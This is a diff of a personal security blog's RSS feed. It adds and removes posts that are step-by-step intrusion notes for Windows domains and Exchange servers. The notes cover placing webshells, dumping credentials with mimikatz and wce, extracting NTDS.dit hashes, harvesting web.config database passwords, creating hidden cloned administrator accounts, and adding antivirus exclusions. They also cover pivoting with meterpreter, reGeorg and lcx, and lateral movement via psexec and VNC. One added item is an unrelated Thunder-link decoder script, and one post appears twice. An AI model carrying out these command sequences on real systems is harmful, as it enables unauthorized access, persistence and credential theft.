@@ -5,9 +5,233 @@
     <description>A blog about programming and network security</description>
     <link>/</link>
     <atom:link href="/feed.xml" rel="self" type="application/rss+xml" />
-    <pubDate>Sat, 07 May 2016 09:57:15 +0800</pubDate>
-    <lastBuildDate>Sat, 07 May 2016 09:57:15 +0800</lastBuildDate>
+    <pubDate>Thu, 12 May 2016 19:52:37 +0800</pubDate>
+    <lastBuildDate>Thu, 12 May 2016 19:52:37 +0800</lastBuildDate>
     <generator>Jekyll v3.1.2</generator>
+    
+      <item>
+        <title>windows 2008 domain controllers</title>
+        <description>&lt;h3 id=&quot;x01-upload-backup-webshells&quot;&gt;0x01 upload backup webshells&lt;/h3&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1.there exists a webshell upload by someone else:https://xx.oo.xx/owa/auth/error1.aspx
+2.webshell in different folder has different privileges
+    https://xx.oo.xx/aspnet_client/system_web/2_0_50727/some.aspx      C:\inetpub\wwwroot\&amp;gt; whoami ---&amp;gt; iis apppool\defaultapppool
+    https://xx.oo.xx对应C:\inetpub\wwwroot\      目录下（index.html）   iis权限
+    https://xx.oo.xx/owa/auth/some.aspx    C:\inetpub\wwwroot\&amp;gt; whoami ---&amp;gt; nt authority\system
+    https://xx.oo.xx/owa/对应C:\Program Files\Microsoft\Exchange Server\V14\ClientAccess\Owa\ 目录 system权限
+3.upload a strong webshell but found &quot;/&quot; error
+    aspx大马连接报错&quot;/&quot;解决方法:http://www.asp-muma.com/?post=97
+    my way defferent from uppon one:
+    create a new folder,create a web.config file with below content:
+    --------------------------content------------------------
+    &amp;lt;configuration&amp;gt;
+        &amp;lt;system.web&amp;gt;
+            &amp;lt;customErrors mode=&quot;Off&quot;/&amp;gt;
+        &amp;lt;/system.web&amp;gt;
+    &amp;lt;/configuration&amp;gt;
+    --------------------------end of content----------------
+    then upon a strong webshell to my new created folder,found no more error.
+4.different parse 
+    C:\Program Files\Microsoft\Exchange Server\V14\ClientAccess\Owa\xxoo\xxoo\大马.aspx is ok to parse
+    C:\Program Files\Microsoft\Exchange Server\V14\ClientAccess\Owa\xxoo\xxoo\一句话.aspx is not ok to parse
+    C:\Program Files\Microsoft\Exchange Server\V14\ClientAccess\Owa\一句话.aspx is ok to parse
+    C:\Program Files\Microsoft\Exchange Server\V14\ClientAccess\Owa\auth\一句话.aspx is ok to parse
+    C:\inetpub\wwwroot\大马.aspx is not ok to parse before my &quot;adding a new web.config&quot; way in upon 3
+    C:\inetpub\wwwroot\一句话.aspx is ok to parse,with iis pri
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h3 id=&quot;x02-find-domain-controllers-and-dc-administrator-username--password&quot;&gt;0x02 find domain controllers and dc administrator username &amp;amp; password&lt;/h3&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://drops.wooyun.org/tips/421 
+    dsquery server(best)
+    nslookup -type=SRV _ldap._tcp.baidu.com(baidu.com is a domain name,others should be like xxx.org.xx)
+    netdom query fsmo
+mimikatz
+    log
+    privilege::debug
+    sekurlsa::logonpasswords
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h3 id=&quot;x03-get-all-hashs-in-the-domain-controllers-machine&quot;&gt;0x03 get all hashs in the domain controllers machine&lt;/h3&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;link a:
+    http://drops.wooyun.org/tips/6617
+link b:
+    https://blogs.msdn.microsoft.com/adioltean/2005/01/05/script-recipe-of-the-week-how-to-copy-an-opened-file/
+*attention*:
+    in link a,the script name to use shadowcopy is vsshadow.exe
+    in link b,the script name to use shadowcopy is vshadow.exe
+I get vshadow.exe from installing https://www.microsoft.com/en-us/download/confirmation.aspx?id=23490,then search vshadow.exe in the system,this is a quick link:
+    http://pan.baidu.com/s/1cMC07W
+there are three files:shadowcopy_ntds.bat,quarkspwdump.exe(v0.2b),vshadow.exe
+step0:
+    upload these three files to target machine&#39;s folder,eg. c:\windows\myfolder\
+step1:
+    shadowcopy_ntds.bat c:\windows\ntds\ntds.dit c:\windows\myfolder\ntds.dit
+    (this shadowcopy_ntds.bat is from link b,it can copy any file while the file is being used)
+step2:
+    esentutl /p /o ntds.dit
+step3:
+    QuarksPwDump.exe --dump-hash-domain -with-history -nt c:\windows\ntds\ntds.dit -o c:\windows\myfolder\log.txt
+    (or quarkspwdump.exe --dump-hash-domain -hist -nt c:\windows\ntds\ntds.dit -o c:\windows\myfolder\log.txt)
+    the origin commands from link a is &quot;QuarksPwDump.exe -dhb -hist -nt ntds.dit -o log.txt&quot;,which proved wrong with my quarkspwdump.exe file
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+</description>
+        <pubDate>Mon, 09 May 2016 00:00:00 +0800</pubDate>
+        <link>/web/2016/05/09/windows-2008-domain-controllers/</link>
+        <guid isPermaLink="true">/web/2016/05/09/windows-2008-domain-controllers/</guid>
+        
+        <category>doamin controllers</category>
+        
+        <category>inside network</category>
+        
+        <category>aspx</category>
+        
+        <category>exchange server</category>
+        
+        <category>outlook</category>
+        
+        
+        <category>web</category>
+        
+      </item>
+    
+      <item>
+        <title>windows 2008 domain controllers</title>
+        <description>&lt;h3 id=&quot;x01-upload-backup-webshells&quot;&gt;0x01 upload backup webshells&lt;/h3&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1.there exists a webshell upload by someone else:https://xx.oo.xx/owa/auth/error1.aspx
+2.webshell in different folder has different privileges
+    https://xx.oo.xx/aspnet_client/system_web/2_0_50727/some.aspx      C:\inetpub\wwwroot\&amp;gt; whoami ---&amp;gt; iis apppool\defaultapppool
+    https://xx.oo.xx对应C:\inetpub\wwwroot\      目录下（index.html）   iis权限
+    https://xx.oo.xx/owa/auth/some.aspx    C:\inetpub\wwwroot\&amp;gt; whoami ---&amp;gt; nt authority\system
+    https://xx.oo.xx/owa/对应C:\Program Files\Microsoft\Exchange Server\V14\ClientAccess\Owa\ 目录 system权限
+3.upload a strong webshell but found &quot;/&quot; error
+    aspx大马连接报错&quot;/&quot;解决方法:http://www.asp-muma.com/?post=97
+    my way defferent from uppon one:
+    create a new folder,create a web.config file with below content:
+    --------------------------content------------------------
+    &amp;lt;configuration&amp;gt;
+        &amp;lt;system.web&amp;gt;
+            &amp;lt;customErrors mode=&quot;Off&quot;/&amp;gt;
+        &amp;lt;/system.web&amp;gt;
+    &amp;lt;/configuration&amp;gt;
+    --------------------------end of content----------------
+    then upon a strong webshell to my new created folder,found no more error.
+4.different parse 
+    C:\Program Files\Microsoft\Exchange Server\V14\ClientAccess\Owa\xxoo\xxoo\大马.aspx is ok to parse
+    C:\Program Files\Microsoft\Exchange Server\V14\ClientAccess\Owa\xxoo\xxoo\一句话.aspx is not ok to parse
+    C:\Program Files\Microsoft\Exchange Server\V14\ClientAccess\Owa\一句话.aspx is ok to parse
+    C:\Program Files\Microsoft\Exchange Server\V14\ClientAccess\Owa\auth\一句话.aspx is ok to parse
+    C:\inetpub\wwwroot\大马.aspx is not ok to parse before my &quot;adding a new web.config&quot; way in upon 3
+    C:\inetpub\wwwroot\一句话.aspx is ok to parse,with iis pri
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h3 id=&quot;x02-find-domain-controllers-and-dc-administrator-username--password&quot;&gt;0x02 find domain controllers and dc administrator username &amp;amp; password&lt;/h3&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://drops.wooyun.org/tips/421 
+    dsquery server(best)
+    nslookup -type=SRV _ldap._tcp.baidu.com(baidu.com is a domain name,others should be like xxx.org.xx)
+    netdom query fsmo
+mimikatz
+    log
+    privilege::debug
+    sekurlsa::logonpasswords
+at 23:00 /every:M,T,W,Th,F,S,Su c:\recycler\1.bat
+    1.bat:
+    c:\recycler\wce.exe -w &amp;gt;&amp;gt; c:\recycler\1.txt
+    (but this &quot;at&quot; command may not be hidden) ### 0x03 get all hashs in the domain controllers machine
+link a:
+    http://drops.wooyun.org/tips/6617
+link b:
+    https://blogs.msdn.microsoft.com/adioltean/2005/01/05/script-recipe-of-the-week-how-to-copy-an-opened-file/
+*attention*:
+    in link a,the script name to use shadowcopy is vsshadow.exe
+    in link b,the script name to use shadowcopy is vshadow.exe
+I get vshadow.exe from installing https://www.microsoft.com/en-us/download/confirmation.aspx?id=23490,then search vshadow.exe in the system,this is a quick link:
+    http://pan.baidu.com/s/1cMC07W
+there are three files:shadowcopy_ntds.bat,quarkspwdump.exe(v0.2b),vshadow.exe
+step0:
+    upload these three files to target machine&#39;s folder,eg. c:\windows\myfolder\
+step1:
+    shadowcopy_ntds.bat c:\windows\ntds\ntds.dit c:\windows\myfolder\ntds.dit
+    (this shadowcopy_ntds.bat is from link b,it can copy any file while the file is being used)
+step2:
+    esentutl /p /o ntds.dit
+step3:
+    QuarksPwDump.exe --dump-hash-domain -with-history -nt c:\windows\ntds\ntds.dit -o c:\windows\myfolder\log.txt
+    (or quarkspwdump.exe --dump-hash-domain -hist -nt c:\windows\ntds\ntds.dit -o c:\windows\myfolder\log.txt)
+    the origin commands from link a is &quot;QuarksPwDump.exe -dhb -hist -nt ntds.dit -o log.txt&quot;,which proved wrong with my quarkspwdump.exe file
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+</description>
+        <pubDate>Mon, 09 May 2016 00:00:00 +0800</pubDate>
+        <link>/web/2016/05/09/windows-2003-domain-controllers/</link>
+        <guid isPermaLink="true">/web/2016/05/09/windows-2003-domain-controllers/</guid>
+        
+        <category>doamin controllers</category>
+        
+        <category>inside network</category>
+        
+        <category>aspx</category>
+        
+        <category>exchange server</category>
+        
+        <category>outlook</category>
+        
+        
+        <category>web</category>
+        
+      </item>
+    
+      <item>
+        <title>迅雷加密链接批量转化</title>
+        <description>&lt;p&gt;将thunder://….的link转化成可以在迅雷中直接下载的link,eg.ftp://…&lt;br /&gt;
+that is:&lt;br /&gt;
+thunder://…  ==&amp;gt;  ftp://… or something else&lt;br /&gt;
+用于手机迅雷下载vedio时wifi下载速度不快，将手机迅雷中的相应下载link放到pc端下载.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
+    &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;re&lt;/span&gt;
+    &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;base64&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;get_pure_list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;pure_list&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;each&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;each&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;re&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sub&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;r&#39;(&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s)&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;each&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;pure_list&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;each&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+            &lt;span class=&quot;c&quot;&gt;#re.sub(r&#39;\r\n&#39;,&quot;&quot;,each)&lt;/span&gt;
+            &lt;span class=&quot;c&quot;&gt;#re.sub(r&#39;\n&#39;,&quot;&quot;,each)&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pure_list&lt;/span&gt;
+        
+    &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;1.txt&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;r+&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;nb&quot;&gt;all&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;readlines&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;all_pure&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;join&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get_pure_list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;all&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;tmp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;all_pure&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;split&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;thunder://&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;all_pure&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;each&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tmp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:]:&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;2.txt&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;a+&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;decode_link&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;base64&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;decodestring&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;each&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;decode_link&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;decode_link&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__name__&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;__main__&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+</description>
+        <pubDate>Sun, 08 May 2016 00:00:00 +0800</pubDate>
+        <link>/python/2016/05/08/thunder/</link>
+        <guid isPermaLink="true">/python/2016/05/08/thunder/</guid>
+        
+        <category>auxilary</category>
+        
+        <category>python</category>
+        
+        
+        <category>python</category>
+        
+      </item>
     
       <item>
         <title>idea</title>
@@ -24,7 +248,7 @@ line2&amp;gt; 不断提升自己核心单点打击力------&amp;gt; 如针对一
                      |
                      |
                      |
-                  决定方向
+                  决定方向(挖洞牛中的渗透牛and核心竞争力是在渗透中挖洞)
                      |
                      |
                      |
@@ -33,6 +257,7 @@ line2&amp;gt; 不断提升自己核心单点打击力------&amp;gt; 如针对一
                      |
                      |
     &quot;他到底承受了多少，才能到这个水平&quot;&amp;lt;博人传&amp;gt;
+        &quot;吃得苦中苦，方为人上人&quot;&amp;lt;欢乐颂&amp;gt;
                      |
                      |
                      |
@@ -2237,488 +2462,6 @@ input your number here:&#39;&#39;&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&
         
         
         <category>web</category>
-        
-      </item>
-    
-      <item>
-        <title>Inside network in workgroup</title>
-        <description>&lt;h3 id=&quot;x01-base&quot;&gt;0x01 Base&lt;/h3&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;got a webshell of xxx.xxx.xxx.101(run aspx)  
-don&#39;t know how to get system shell from this webshell  
-there exists not only one site on xxx.xxx.xxx.101  
-find xxx.xxx.xxx.101 has another address 10.10.10.101
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;h3 id=&quot;x02-steps&quot;&gt;0x02 Steps&lt;/h3&gt;
-
-&lt;h4 id=&quot;search-webconfig-on-all-sites-to-find-sa-and-sapass&quot;&gt;1&amp;gt;search web.config on all sites to find sa and sapass&lt;/h4&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1.bat
-@echo off
-goto :main
-这是注释：(for /f &quot;delims=&quot;的作用为取消默认的以空格等符号作为分割符
-dir /s 实现了linux中的find功能，for /r path %%i in (web.conf?g) do ... 也可以实现find功能，但是自己实现时发现for /r path ...中的path只能是一个具体路径，不能是变量，这样就不能遍历全部磁盘了)
-:main
-set str=c d e f g h i j k l m n o p q r s t u v w x y z 
-echo  当前硬盘的分区有： 
-for %%i in (%str%) do (
-if exist %%i: (echo %%i:
-for /f &quot;delims=&quot; %%j in (&#39;dir /b /s &quot;%%i:\web.conf?g&quot;&#39;) do (
-echo *****filepath***** &amp;gt;&amp;gt; tmp.txt
-echo %%j &amp;gt;&amp;gt; tmp.txt
-type &quot;%%j&quot; &amp;gt;&amp;gt; tmp.txt
-echo. &amp;gt;&amp;gt; tmp.txt
-echo ---------------------------- &amp;gt;&amp;gt; tmp.txt
-echo 我是美丽的分割线 &amp;gt;&amp;gt; tmp.txt
-echo ---------------------------- &amp;gt;&amp;gt; tmp.txt
-echo. &amp;gt;&amp;gt; tmp.txt
-)
-)
-)
-
-2.vbs
-Set ws = CreateObject(&quot;Wscript.Shell&quot;)
-ws.run &quot;cmd /c 1.bat&quot;,vbhide
-
-cscript 2.vbs
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;h5 id=&quot;or-download-fromhttpsgithubcomxinghuacaibattreemastergetwebconfigbat&quot;&gt;or download from:&lt;code class=&quot;highlighter-rouge&quot;&gt;https://github.com/xinghuacai/bat/tree/master/get_web_config_bat&lt;/code&gt;&lt;/h5&gt;
-
-&lt;h4 id=&quot;find-sa-and-sapass-of-1010101but-as-a-inside-network-pc3389-is-not-allowed-from-outside&quot;&gt;[+] find sa and sapass of 10.10.10.1,but as a inside network pc,3389 is not allowed from outside&lt;/h4&gt;
-
-&lt;h4 id=&quot;upload-a-tunnelaspxfrom-regeorg-to--xxxxxxxxx101&quot;&gt;2&amp;gt;upload a tunnel.aspx(from reGeorg) to  xxx.xxx.xxx.101&lt;/h4&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[python] reGeorg.py -p 1080 -u http://xxx.xxx.xxx.101/xx/tunnel.aspx
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;h4 id=&quot;use-sa-pri-in-chopper-execute&quot;&gt;3&amp;gt;use sa pri in chopper execute:&lt;/h4&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;net user tmp /add &amp;amp; net localgroup administrators tmp /add  
-net localgroup &quot;remote desktop users&quot; tmp /add
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;h4 id=&quot;runas-admin-cmd--mstsc-console-v1010101--admin&quot;&gt;4&amp;gt;runas admin-&amp;gt;cmd-&amp;gt; mstsc /console /v:10.10.10.1 -admin&lt;/h4&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[10.10.10.1:3389 with tmp account]:  
-add a superhide administrator account cloned from administrator account:  
-net user tmp$ /add &amp;amp; net localgroup administrators tmp$ /add
-regedit-&amp;gt;local machine-&amp;gt;sam-&amp;gt;account-&amp;gt;name
-export 0x111&amp;lt;assume as administrator&#39;s&amp;gt; as admin.reg
-export 0x222&amp;lt;assume as tmp$&#39;s&amp;gt; as user.reg
-export account-&amp;gt;name-&amp;gt;tmp$ as tmp.reg
-copy /F value from admin.reg to user.reg
-net user tmp$ /del
-import tmp.reg and user.reg
-delete admin.reg,user.reg,tmp.reg
-logoff
-
-[10.10.10.1:3389 with tmp$ account]:  
-net user tmp /del
-open setup of eset to add exclude file path
-copy \\tsclient\mimikatz\ exclude_folder
-
-[run mimikatz]:  
-privilege::debug
-sekurlsa::logonpasswords
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;h4 id=&quot;upload-a-meterpreter-payload-to-1010101&quot;&gt;5&amp;gt;upload a meterpreter payload to 10.10.10.1&lt;/h4&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;meterpreter&amp;gt;run get_local_subnets
-            10.0.0.0/255.0.0.0
-meterpreter&amp;gt;background
-(handler)&amp;gt;route add 10.0.0.0 255.0.0.0 1
-(handler)&amp;gt;route print
-(handler)&amp;gt;use auxiliary/scanner/portscan/tcp
-set ports 25,110,21,80,8080,443,1433,3606,3389,5900
-set rhosts 10.10.10.0/24
-set threads 24
-exploit
-
-smb:
-(handler)use exploit/windows/smb/psexec
-(handler)set rhosts 10.10.10.0/24
-(handler)set username and pass from sekurlsa::logonpasswords in mimikatz before
-or the password find by mimikatz in msf:
-load  mimikatz
-mimikatz_command -f sekurlsa::searchPasswords
-(handler)exploit
-enter other pc by smbpass
-use mimikatz to find morepassword
-search regedit to find morevncpassword
-
-vnc:
-search winvnc password in 10.10.10.1:
-if ini file with password was delete,then open regedit search &quot;password&quot; 
-F3+F3+F3...
-find vnc password
-use vnccrack tool in cain to carck it
-get vncpassword
-use auxiliary/scanner/vnc/vnc_login
-set rhosts 10.10.10.0/24
-set password vpnpassword
-exploit
-enter other pc by vnc password
-use mimikatz to find morepassword
-search regedit to find morevncpassword
-
-smb&amp;amp;vnc
-use morepassword in exploit/windows/smb/psexec
-use morevncpassword in auxiliary/scanner/vnc/vnc_login
-
-
-
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-</description>
-        <pubDate>Sun, 10 Apr 2016 00:00:00 +0800</pubDate>
-        <link>/web/2016/04/10/windows-2003-inside-network-aspx/</link>
-        <guid isPermaLink="true">/web/2016/04/10/windows-2003-inside-network-aspx/</guid>
-        
-        <category>inside network</category>
-        
-        <category>windows</category>
-        
-        <category>aspx</category>
-        
-        <category>工作组</category>
-        
-        
-        <category>web</category>
-        
-      </item>
-    
-      <item>
-        <title>windows 2003 r2 aspx</title>
-        <description>&lt;h3 id=&quot;search-webconfig-to-find-sa-and-sa-password&quot;&gt;1&amp;gt;search web.config———&amp;gt; to find sa and sa password&lt;/h3&gt;
-
-&lt;h3 id=&quot;choppperor-aspxspyto-connect-dbget-sa-privilege&quot;&gt;2&amp;gt;choppper(or aspxspy)to connect db,get sa privilege&lt;/h3&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sometimes strong webshell (like aspxspy.aspx) cannot get system privilege with sa and pass,try:
-1.use sa execute cmd in chopper
-or
-2.restart the system and try strong webshell like aspxspy.aspx
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;h3 id=&quot;net-stop-sharedaccess&quot;&gt;3&amp;gt;net stop sharedaccess&lt;/h3&gt;
-
-&lt;h3 id=&quot;net-stop-policyagent&quot;&gt;4&amp;gt;net stop policyagent&lt;/h3&gt;
-
-&lt;h3 id=&quot;use-sa-pri-run-meterpreteruse-veil-to-jail-payload&quot;&gt;5&amp;gt;use sa pri run meterpreter(use veil to jail) payload&lt;/h3&gt;
-
-&lt;h3 id=&quot;use-meterpreter-shell-to-open-vnc-or-desktop&quot;&gt;6&amp;gt;use meterpreter shell to open vnc or desktop&lt;/h3&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;meterpreter&amp;gt;run vnc
-or
-meterpreter&amp;gt;background
-msf&amp;gt;use post/windows/manage/enable_rdp
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;h3 id=&quot;if-6-failuse-sa-privilegesin-chopperto-run&quot;&gt;7&amp;gt;if 6 fail,use sa privileges(in chopper)to run:&lt;/h3&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;victim:lcx -slave vps_ip vps_port victim_ip 3389
-vps:lcx -listen vps_port 1234
-vps:mstsc /console /v:127.0.0.1:1234  
-
-Notice:normally,mstsc----&amp;gt;127.0.0.1:1234 is ok,sometimes exists connect num restrict,use it.in win7: need runas admin,and use:mstsc /console /v:127.0.0.1:1234 -admin
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-</description>
